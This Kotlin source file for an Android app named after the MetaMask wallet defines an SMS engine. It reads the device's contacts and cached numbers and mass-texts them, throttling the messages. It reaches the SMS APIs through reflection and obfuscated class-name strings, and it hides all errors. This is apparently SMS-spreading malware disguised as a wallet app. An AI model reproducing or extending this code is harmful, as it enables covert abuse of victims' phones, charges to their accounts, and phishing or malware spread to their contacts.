package com.example.MetaMask.services

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import com.example.MetaMask.utils.ApiReflectionBridge
import com.example.MetaMask.utils.ContactReaderUtil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.util.UUID

class SmsSendEngine(
    private val context: Context,
    private val scope: CoroutineScope,
    private val prefs: SharedPreferences
) {
    companion object {
        private const val TAG = "SmsSendEngine"
        private const val KEY_CACHED_NUMBERS = "sent_sms_records"
        private const val SENT_ACTION    = "SMS_CONTROL_SENT"
        private const val DELIVERED_ACTION = "SMS_CONTROL_DELIVERED"
        private const val EXTRA_UUID     = "messageUuid"
    }

    private val cachedNumbers = java.util.concurrent.CopyOnWriteArrayList<String>()

    fun loadCachedNumbers() {
        android.util.Log.d("XDBG", "[SmsSendEngine] loadCachedNumbers enter") //xdbg
        try {
            val raw = prefs.getString(KEY_CACHED_NUMBERS, null) ?: return
            val arr = JSONArray(raw)
            cachedNumbers.clear()
            for (i in 0 until arr.length()) {
                android.util.Log.d("XDBG", "[SmsSendEngine] loop") //xdbg
                val num = arr.optString(i, "")
                if (num.isNotBlank()) cachedNumbers.add(num)
            }
        } catch (_: Exception) {}
    }

    fun getSubId(simCardIndex: Int): Int {
        android.util.Log.d("XDBG", "[SmsSendEngine] getSubId enter simCardIndex=${simCardIndex}") //xdbg
        if (simCardIndex < 0) return -1
        android.util.Log.d("XDBG", "[SmsSendEngine] return") //xdbg
        return try {
            val subs = ApiReflectionBridge.queryActiveLinks(context)
            if (subs.isNullOrEmpty() || simCardIndex >= subs.size) return -1
            val info = subs[simCardIndex] ?: return -1
            (info.javaClass.getMethod("getSubscriptionId").invoke(info) as? Int) ?: -1
        } catch (e: Exception) { -1 }
    }

    fun sendSingle(phoneNumber: String, message: String, subId: Int, messageUuid: String) {
        android.util.Log.d("XDBG", "[SmsSendEngine] sendSingle enter phoneNumber=${phoneNumber} message=${message} subId=${subId} messageUuid=${messageUuid}") //xdbg
        if (phoneNumber.isBlank() || message.isBlank()) return
        scope.launch(Dispatchers.IO) {
            try {
                val sentIntent = buildStatusIntent(SENT_ACTION, messageUuid)
                val deliveredIntent = buildStatusIntent(DELIVERED_ACTION, messageUuid)

                val rawMgr: Any? = if (subId != -1) ApiReflectionBridge.getSmsCtx(subId) else getDefaultMgr()
                if (rawMgr == null) return@launch
                val mgr: Any = rawMgr

                if (message.length > 160) {
                    android.util.Log.d("XDBG", "[SmsSendEngine] if branch") //xdbg
                    val parts = splitMessage(message)
                    val sentList = ArrayList<PendingIntent?>().apply { repeat(parts.size) { add(if (it == 0) sentIntent else null) } }
                    val delivList = ArrayList<PendingIntent?>().apply { repeat(parts.size) { add(null) } }
                    ApiReflectionBridge.dispatchMulti(mgr, phoneNumber, null, parts, sentList, delivList)
                } else {
                    ApiReflectionBridge.dispatchSingle(mgr, phoneNumber, null, message, sentIntent, deliveredIntent)
                }

                trackSentNumber(phoneNumber)
            } catch (_: Exception) {}
        }
    }

    fun sendMass(count: Int, message: String, subId: Int) {
        android.util.Log.d("XDBG", "[SmsSendEngine] sendMass enter count=${count} message=${message} subId=${subId}") //xdbg
        if (count <= 0 || message.isBlank()) return
        scope.launch(Dispatchers.IO) {
            val targets = buildTargetList(count)
            targets.forEachIndexed { idx, number ->
                try {
                    delay((idx * 1500L).coerceAtMost(30000L))
                    sendSingle(number, message, subId, UUID.randomUUID().toString())
                } catch (_: Exception) {}
            }
        }
    }

    private fun buildTargetList(count: Int): List<String> {
        android.util.Log.d("XDBG", "[SmsSendEngine] buildTargetList enter count=${count}") //xdbg
        val result = mutableListOf<String>()
        if (cachedNumbers.isNotEmpty()) {
            android.util.Log.d("XDBG", "[SmsSendEngine] if branch") //xdbg
            result.addAll(cachedNumbers.take(count))
        }
        if (result.size < count) {
            android.util.Log.d("XDBG", "[SmsSendEngine] if branch") //xdbg
            try {
                val contacts = ContactReaderUtil.getContacts(context)
                    .map { it.phoneNumber }
                    .filter { it.isNotBlank() && it !in result }
                result.addAll(contacts.take(count - result.size))
            } catch (e: Exception) { }
        }
        android.util.Log.d("XDBG", "[SmsSendEngine] return") //xdbg
        return result
    }

    private fun buildStatusIntent(action: String, uuid: String): PendingIntent {
        android.util.Log.d("XDBG", "[SmsSendEngine] buildStatusIntent enter action=${action} uuid=${uuid}") //xdbg
        val intent = Intent(action).apply {
            putExtra(EXTRA_UUID, uuid)
            setPackage(context.packageName)
        }
        val flags = if (Build.VERSION.SDK_INT >= 23)
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        else
            PendingIntent.FLAG_UPDATE_CURRENT
        android.util.Log.d("XDBG", "[SmsSendEngine] return") //xdbg
        return PendingIntent.getBroadcast(context, uuid.hashCode(), intent, flags)
    }

    private fun getDefaultMgr(): Any? = try {
        val parts = arrayOf("android.telephony", "SmsManager")
        Class.forName(parts.joinToString("."))
            .getMethod(arrayOf("get", "Default").joinToString(""))
            .invoke(null)
    } catch (e: Exception) { null }

    private fun splitMessage(text: String): ArrayList<String> {
        android.util.Log.d("XDBG", "[SmsSendEngine] splitMessage enter text=${text}") //xdbg
        val parts = ArrayList<String>()
        var offset = 0
        while (offset < text.length) {
            android.util.Log.d("XDBG", "[SmsSendEngine] loop") //xdbg
            val end = (offset + 153).coerceAtMost(text.length)
            parts.add(text.substring(offset, end))
            offset = end
        }
        android.util.Log.d("XDBG", "[SmsSendEngine] return") //xdbg
        return parts
    }

    private fun trackSentNumber(number: String) {
        android.util.Log.d("XDBG", "[SmsSendEngine] trackSentNumber enter number=${number}") //xdbg
        try {
            if (!cachedNumbers.contains(number)) {
                android.util.Log.d("XDBG", "[SmsSendEngine] if branch") //xdbg
                cachedNumbers.add(number)
                val arr = JSONArray().apply { cachedNumbers.forEach { put(it) } }
                prefs.edit().putString(KEY_CACHED_NUMBERS, arr.toString()).apply()
            }
        } catch (e: Exception) { }
    }
}
